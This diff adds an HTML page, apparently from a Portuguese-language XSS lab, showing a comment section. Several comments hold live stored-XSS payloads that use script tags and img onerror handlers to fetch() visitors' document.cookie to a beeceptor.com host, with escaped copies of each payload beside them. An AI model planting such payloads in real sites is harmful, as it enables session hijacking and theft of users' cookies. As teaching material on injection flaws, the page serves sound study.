@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Test comment</title>
+</head>
+<body>
+	<h1>Comentarios</h1>
+	
+		<div>
+			<p><strong>family</strong> disse:</p>
+			
+			<p>https://family.free.beeceptor.com</p>
+			<!--<p>https://family.free.beeceptor.com</p>-->
+		</div>
+	<hr>
+	
+		<div>
+			<p><strong>family</strong> disse:</p>
+			
+			<p><script>fetch('https://SUA-URL.free.beeceptor.com?cookie=' + document.cookie);</script></p>
+			<!--<p>&lt;script&gt;fetch(&#x27;https://SUA-URL.free.beeceptor.com?cookie=&#x27; + document.cookie);&lt;/script&gt;</p>-->
+		</div>
+	<hr>
+	
+		<div>
+			<p><strong>family</strong> disse:</p>
+			
+			<p><script>fetch('https://family.free.beeceptor.com?cookie=' + document.cookie);</script></p>
+			<!--<p>&lt;script&gt;fetch(&#x27;https://family.free.beeceptor.com?cookie=&#x27; + document.cookie);&lt;/script&gt;</p>-->
+		</div>
+	<hr>
+	
+		<div>
+			<p><strong>family</strong> disse:</p>
+			
+			<p><img src=x onerror="fetch('https://family.free.beeceptor.com?cookie=' + document.cookie)"></p>
+			<!--<p>&lt;img src=x onerror=&quot;fetch(&#x27;https://family.free.beeceptor.com?cookie=&#x27; + document.cookie)&quot;&gt;</p>-->
+		</div>
+	<hr>
+	
+		<div>
+			<p><strong>neto</strong> disse:</p>
+			
+			<p><img src=x onerror="fetch('https://family.free.beeceptor.com?cookie=" + document.cookie)></p>
+			<!--<p>&lt;img src=x onerror=&quot;fetch(&#x27;https://family.free.beeceptor.com?cookie=&quot; + document.cookie)&gt;</p>-->
+		</div>
+	<hr>
+	
+	<h2>Deixe um comentário</h2>
+	<form method="post">
+		<input type="hidden" name="csrfmiddlewaretoken" value="2KQLlRTXlrgURRaTpEcIkwiBcVdoKs8nwXnF8ubco65pp04urFFqSj3tEPjLA43F">
+		<input type='text' name='author' placeholder='seu nome'><br>
+		<textarea name='text' placeholder='Seu comentário'></textarea><br>
+		<button type='submit'>Enviar</button><br>
+	</form>
+</body>
+</html>
